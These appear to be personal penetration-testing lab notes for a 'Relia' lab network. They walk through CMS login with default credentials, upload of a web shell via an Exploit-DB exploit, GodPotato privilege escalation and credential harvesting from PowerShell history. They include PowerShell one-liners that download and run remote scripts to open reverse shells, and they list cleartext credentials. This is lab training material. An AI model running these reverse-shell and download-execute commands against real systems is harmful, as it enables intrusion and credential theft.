# Relia

## Legacy .249

### Web

go to [http://192.168.105.249:8000/cms/admin.php](http://192.168.105.249:8000/cms/admin.php) and login with admin:admin

then [https://www.exploit-db.com/exploits/50616](https://www.exploit-db.com/exploits/50616)

upload the web shell and then go on [http://192.168.105.249:8000/cms/files/shell.pHp?cmd=dir](http://192.168.105.249:8000/cms/files/shell.pHp?cmd=dir) to launch a reverse shell&#x20;

```
iex (iwr -UseBasicParsing http://192.168.105.250/Invoke-PowerShellTcp.ps1)
```

you have connettivity only on the given machine (.250)

### privesc

use godpotato

in powershell history at C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine there are damon credential

damon : i6yuT6tym@

## Legacy .189

Download /staging/.git from .249 to analyze the commits

maildmz@relia.com:DPuBT9tGCBrTbR

now use this attack [https://github.com/gustanini/WinLib\_Gen](https://github.com/gustanini/WinLib_Gen)



{% code overflow="wrap" %}
```
powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.190.250:80/powercat.ps1);powercat -c 192.168.190.250 -p 4444 -e powershell"
```
{% endcode %}

